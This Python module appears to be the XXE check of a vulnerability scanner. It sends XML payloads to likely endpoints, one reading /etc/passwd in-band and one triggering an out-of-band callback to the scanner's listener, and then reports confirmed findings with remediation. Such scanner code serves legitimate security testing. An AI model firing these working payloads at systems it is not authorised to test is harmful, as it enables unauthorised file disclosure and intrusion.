"""Native check: XML External Entity (XXE) injection.

POSTs XML carrying an external-entity declaration to endpoints that may parse
XML, and confirms XXE two ways:

- **In-band file read** — an entity pointing at ``file:///etc/passwd``; a hit is
  the passwd signature appearing in the response.
- **Out-of-band** — an entity pointing at reconowl's OOB listener (reusing the SSRF
  listener); a hit is the server fetching that URL. Ideal for blind XXE.

Both require the server to actually resolve the entity, so false positives are
essentially nil.
"""

from __future__ import annotations

import re
import secrets
import time
import urllib.parse

from ..models import Finding, Severity
from ..utils.concurrency import parallel_map
from ..utils.net import HttpClient, build_proof, in_scope
from .ssrf import OOBListener, _local_ip

_SOURCE = "native:xxe"

# Endpoints that commonly accept XML, appended to the base URL.
_XML_PATHS = ("", "xmlrpc.php", "api", "api/xml", "soap", "services", "ws", "rest", "xml")

_CONTENT_TYPE = {"Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*"}
_PASSWD_RE = re.compile(r"root:.*?:0:0:")


def inband_payload() -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<root><data>&xxe;</data></root>"
    )


def oob_payload(url: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{url}">]>'
        "<root><data>&xxe;</data></root>"
    )


def detect_inband(text: str) -> bool:
    """True if the response leaked /etc/passwd content (entity was expanded)."""
    return bool(_PASSWD_RE.search(text or ""))


def _candidates(result, cap: int) -> list[str]:
    base = result.target.base_url
    urls: list[str] = []
    seen: set[str] = set()

    def add(url: str) -> None:
        if in_scope(url, result.target.host) and url not in seen:
            seen.add(url)
            urls.append(url)

    if base:
        for path in _XML_PATHS:
            add(urllib.parse.urljoin(base + "/", path) if path else base)
    for ep in result.endpoints:
        add(ep.url)
    return urls[:cap]


def _oob_check(candidates, client, config, ui):
    findings: list[Finding] = []
    confirmed: set[str] = set()

    oob_host = config.oob_host or _local_ip()
    try:
        listener = OOBListener(port=config.oob_port)
    except OSError as exc:
        ui.warn(f"XXE OOB listener could not start ({exc}); in-band only.")
        return findings, confirmed
    listener.start()

    token_map: dict[str, str] = {}
    try:
        for url in candidates:
            token = "reconowlxxe" + secrets.token_hex(4)
            token_map[token] = url
            payload = oob_payload(f"http://{oob_host}:{listener.port}/{token}")
            client.request("POST", url, headers=_CONTENT_TYPE, data=payload, allow_redirects=False)
        time.sleep(3.0)
        for token, url in token_map.items():
            if listener.got(token):
                confirmed.add(url)
                findings.append(
                    Finding(
                        title="XXE confirmed (out-of-band)",
                        severity=Severity.HIGH,
                        target=None,
                        category="xxe",
                        location=url,
                        description="An XML external entity caused the server to make a "
                        "request to an attacker-controlled host (OOB callback received), "
                        "confirming blind XXE.",
                        remediation="Disable external entity and DTD processing in the "
                        "XML parser (e.g. FEATURE_SECURE_PROCESSING / defusedxml).",
                        evidence=f"callback token {token} received",
                        source=_SOURCE,
                        extra={"method": "oob"},
                    )
                )
    finally:
        listener.stop()
    return findings, confirmed


def check(result, config, client: HttpClient, ui) -> list[Finding]:
    candidates = _candidates(result, cap=15)
    if not candidates:
        return []

    findings: list[Finding] = []
    confirmed: set[str] = set()

    if getattr(config, "ssrf_oob", True):
        oob_findings, confirmed = _oob_check(candidates, client, config, ui)
        findings.extend(oob_findings)

    def inband_probe(url: str) -> Finding | None:
        resp = client.request(
            "POST", url, headers=_CONTENT_TYPE, data=inband_payload(), allow_redirects=False
        )
        if resp.ok and detect_inband(resp.text):
            return Finding(
                title="XXE — local file disclosure",
                severity=Severity.HIGH,
                target=result.target.host,
                category="xxe",
                location=url,
                description="An XML external entity referencing file:///etc/passwd was "
                "expanded and its contents returned, confirming XXE with local file read.",
                remediation="Disable external entity and DTD processing in the XML "
                "parser (e.g. FEATURE_SECURE_PROCESSING / defusedxml).",
                evidence="response contained /etc/passwd contents",
                source=_SOURCE,
                extra={"method": "in-band"},
                proof=build_proof(resp),
            )
        return None

    inband_candidates = [u for u in candidates if u not in confirmed]
    for _u, finding in parallel_map(inband_probe, inband_candidates, workers=config.concurrency):
        if finding is not None:
            findings.append(finding)

    for f in findings:
        if f.target is None:
            f.target = result.target.host
    return findings
